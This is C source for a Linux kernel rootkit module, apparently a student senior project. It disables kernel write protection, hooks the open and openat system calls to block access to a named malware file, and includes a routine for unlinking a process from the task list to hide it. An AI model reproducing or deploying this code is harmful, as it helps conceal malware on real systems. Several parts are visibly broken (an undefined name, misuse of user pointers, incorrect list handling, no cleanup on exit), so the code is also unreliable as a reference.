#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/types.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/sched.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Noop Noop");
MODULE_DESCRIPTION("Senior Project");
MODULE_VERSION("0.1");

uint64_t * syscall_table;
char * malware_name;

// previously saved function pointers
asmlinkage long (*original_sys_openat)(int dfd, const char __user *filename, int flags, umode_t mode);
asmlinkage long (*original_sys_open)(const char __user *filename, int flags, umode_t mode);


asmlinkage long mal_sys_openat(int dfd, const char __user *filename, int flags, umode_t mode)
{
		if (!strcmp(filename, malware_name)) {
				return EACCES;
		}

		return original_sys_openat(dfd, filename, flags, mode);
}

asmlinkage long mal_sys_open(const char __user *filename, int flags, umode_t mode)
{
		if (!strcmp(filename, malware_name)) {
				return EACCES;
		}

		return original_sys_open(filename, flags, mode);
}


static void hide_task_struct(void)
{
		struct task_struct * task_iter;
		struct task_struct * next_task;
		struct task_struct * prev_task;

		for_each_process(task_iter) {
				if (!strcmp(task_iter->comm, malware_name)) {
						prev_task = list_entry_rcu(task_iter->tasks.prev, struct task_struct, tasks);
						next_task = list_entry_rcu(task_iter->tasks.next, struct task_struct, tasks);
						list_add(&(prev_task->tasks), &(next_task->tasks));
						list_add_tail(&(next_task->tasks), &(prev_task->tasks));
						break;
				}
		}
}


static void patch_syscall(uint64_t index, uint64_t function_ptr)
{
		write_cr0(read_cr0() & ~0x10000);
		syscall_table[index] = function_ptr;
		write_cr0(read_cr0() | 0x10000);
}

static int __init rootkit_init(void)
{
		printk(KERN_INFO "Initializing...\n");

		malware_name = MALWARE_NAME;

		syscall_table = (uint64_t *)kallsyms_lookup_name("sys_call_table");
		printk(KERN_INFO "SYSCALL TABLE @ %llx\n", syscall_table);

		original_sys_open = (long (*)(const char *, int, umode_t))syscall_table[__NR_open];
		original_sys_openat = (long (*)(int, const char *, int, umode_t))syscall_table[__NR_openat];

		patch_syscall(__NR_open, (uint64_t)mal_sys_open);
		patch_syscall(__NR_openat, (uint64_t)mal_sys_openat);

		// TODO: find malware process and remove from process list
		return 0;
}

static void __exit rootkit_exit(void)
{
		// Here, install exit procedures for the rootkit
		printk(KERN_INFO "Exiting...\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
